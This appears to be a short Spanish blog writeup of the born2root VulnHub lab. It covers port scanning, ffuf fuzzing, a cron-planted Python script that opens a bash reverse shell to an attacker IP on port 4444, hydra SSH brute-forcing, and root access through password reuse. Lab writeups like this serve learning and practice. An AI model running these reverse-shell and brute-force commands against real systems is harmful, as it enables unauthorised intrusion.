---
layout: post
title: born2root VulnHub
tags: [pspy,hydra]
description: "born2root VulnHub"
---

## Puertos abiertos

```
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
111/tcp   open  rpcbind 2-4 (RPC #100000)
|   100000  2,3,4        111/tcp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100024  1          44532/tcp   status
|_  100024  1          60170/tcp6  status
44532/tcp open  status  1 (RPC #100024)
```


## Servicio web (80)

### Fuzzing

```
❯ ffuf -w /usr/share/wordlists/dirb/common.txt -u "http://192.168.179.49/FUZZ" -c -t 200
[...]                                                                                               
                        [Status: 200, Size: 5651, Words: 1392, Lines: 284]
.htpasswd               [Status: 403, Size: 298, Words: 22, Lines: 12]
.htaccess               [Status: 403, Size: 298, Words: 22, Lines: 12]
.hta                    [Status: 403, Size: 293, Words: 22, Lines: 12]
files                   [Status: 301, Size: 316, Words: 20, Lines: 10]
icons                   [Status: 301, Size: 316, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 5651, Words: 1392, Lines: 284]
manual                  [Status: 301, Size: 317, Words: 20, Lines: 10]
robots.txt              [Status: 200, Size: 57, Words: 4, Lines: 4]
server-status           [Status: 403, Size: 302, Words: 22, Lines: 12]
```

Path: `http://192.168.179.49/icons/`

![icon](/assets/imgs/born2root/icon.png)

### Usuario jimmy (tarea cron)

```
martin@debian:/tmp$ cat /tmp/sekurity.py
#!/usr/bin/python
import os
os.system("bash -c 'bash -i >& /dev/tcp/192.168.49.179/4444 0>&1'")
```

![jimmy](/assets/imgs/born2root/jimmy.png)


## Usuario hady (fuerza bruta ssh)

```
hydra -l hadi -P hadi.txt 192.168.179.49 ssh -f -V -t 20
```

![hydra](/assets/imgs/born2root/hydra.png)

## Escalada de privilegios

### Reutilización de contraseñas

```
hadi@debian:~$ su
Password:
root@debian:/home/hadi# id
uid=0(root) gid=0(root) groups=0(root)
```
